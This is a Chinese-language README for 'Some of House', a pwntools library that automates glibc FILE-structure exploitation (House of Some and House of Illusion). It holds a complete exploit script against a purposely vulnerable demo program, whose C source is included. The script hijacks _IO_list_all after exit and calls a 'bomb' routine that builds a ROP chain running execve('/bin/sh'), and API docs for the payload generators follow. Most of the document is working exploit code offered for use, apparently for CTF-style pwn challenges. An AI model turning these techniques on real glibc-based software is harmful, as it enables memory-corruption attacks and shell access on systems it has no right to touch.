# Some of House

[![Hits](https://hits.sh/github.com/CsomePro/Some-of-House.svg?label=Visitors)](https://hits.sh/github.com/CsomePro/Some-of-House/)

House实用小工具合集

## 目前已包含的House

House of Some: https://blog.csome.cc/p/house-of-some/

House of Illusion: https://enllus1on.github.io/2024/01/22/new-read-write-primitive-in-glibc-2-38/#more

## HouseOfSome x Illusion的自动化

在exit退出之后使用如下脚本即可

```python
from SomeofHouse import HouseOfSome
io = process("./demo")

...

libc = ELF("./libc.so.6", checksec=None)
libc.address = libc_base
hos = HouseOfSome(libc=libc, controled_addr=fake_file_start)
hos.bomb(io)
```

- controled_addr：可写地址，作为延长的IO_list_all中的io file写入的起始地址

### 举个例子

```python
from pwn import *
from SomeofHouse import HouseOfSome

context.log_level = 'debug'
context.arch = 'amd64'

tob = lambda x: str(x).encode()
io = process("./demo")

io.recvuntil(b"[+] printf: ")
printf_addr = int(io.recvuntil(b"\n", drop=True), 16)
log.success(f"printf_addr: {printf_addr:#x}")

def add(size):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"size> ", tob(size))
    
def write(addr, size, content):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"size> ", tob(size))
    io.sendlineafter(b"addr> ", tob(addr))
    io.sendafter(b"content> ", content)

def leave():
    io.sendlineafter(b"> ", b"3")

libc = ELF("./libc.so.6", checksec=None)
add(0x200)
io.recvuntil(b"[+] done ")
heap_addr = int(io.recvuntil(b"\n", drop=True), 16)
log.success(f"heap_addr: {heap_addr:#x}")

libc_base = printf_addr - libc.symbols["printf"]
log.success(f"libc_base: {libc_base:#x}")

libc.address = libc_base
fake_file_start = heap_addr + 0xe0 + 0xe8
# 上方是信息收集
# ------------------------------------------------- # 
hos = HouseOfSome(libc=libc, controled_addr=fake_file_start)
# 构造第一个任意地址写原语
payload = hos.hoi_read_file_template(fake_file_start, 0x400, fake_file_start, 0)
io.sendlineafter(b"content> ", payload)
write(libc.symbols["_IO_list_all"], 8, p64(heap_addr)) # 劫持_IO_list_all
leave() # exit

hos.bomb(io) # 一句话攻击

io.interactive()
```

demo.c源码

```python
#include<stdio.h>

int main(){
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    int c;
    printf("[+] printf: %p\n", &printf);
    while (1) {
        printf(
            "1. add heap.\n"
            "2. write libc.\n"
            "3. exit\n"
            "> "
        );
        scanf("%d", &c);
        if(c == 1) {
            int size;
            printf("size> ");
            scanf("%d", &size);
            char *p = malloc(size);
            printf("[+] done %p\n", p);
            printf("content> ");
            read(0, p, size);
        } else if(c == 2){
            size_t addr, size;
            printf("size> ");
            scanf("%lld", &size);
            printf("addr> ");
            scanf("%lld", &addr);
            printf("content> ");
            read(0, (char*)addr, size);
        } else {
            break;   
        }
        
    }
    
}
```

## Docs

### class HouseOfSome(libc, controled_addr, zero_addr=libc.symbols['_environ']-0x10)

**Parameters**

- libc([ELF](https://docs.pwntools.com/en/latest/elf/elf.html#pwnlib.elf.elf.ELF)) - libc文件ELF对象
- controled_addr(int) - 可写地址，作为延长的IO_list_all中的io file写入的起始地址
- zero_addr(int) - 内容常0的地址

house of some自动化payload生成类

**Example**

```python
hos = HouseOfSome(libc=libc, controled_addr=fake_file_start)
hos.bomb(io, libc.symbols['_IO_file_underflow'] + 390)
```

#### bomb(io, retn_addr=0) -> None

直接一把梭提权，运用[pwntools自带工具ROP](https://docs.pwntools.com/en/latest/rop/rop.html)，其中执行函数为`rop.call('execve', [b'/bin/sh', 0, 0])`

**Parameters**

- io([tube](https://docs.pwntools.com/en/latest/tubes.html#pwnlib.tubes.tube.tube)) - 交互IO，详细见pwntools文档
- retn_addr(int) - (可选)在运行到IO_new_read_file栈中，存放的返回地址，用于计算返回地址与_envrion泄露的栈的偏移。如果不设置，则会从泄露的栈中寻找IO_flush_all的地址

#### read(fd, buf, len, end=0) -> bytes

**Parameters**

- fd(int) - 文件表述符
- buf(int) - 待写入的地址
- len(int) - 写入长度
- end(bool) - 是否为最后一个fake_file

#### write(fd, buf, len) -> bytes

**Parameters**

- fd(int) - 文件表述符
- buf(int) - 待读取的地址
- len(int) - 读取长度

#### bomb_raw(io, retn_addr=0) -> int

执行此函数之后，当前io处在等待输入，并即将写入ROP

**Parameters**

- io([tube](https://docs.pwntools.com/en/latest/tubes.html#pwnlib.tubes.tube.tube)) - 交互IO，详细见pwntools文档
- retn_addr(int) - (可选)在运行到IO_new_read_file栈中，存放的返回地址，用于计算返回地址与_envrion泄露的栈的偏移。如果不设置，则会从泄露的栈中寻找IO_flush_all的地址

**return**

返回泄露的栈地址，此栈地址是ROP的起始地址

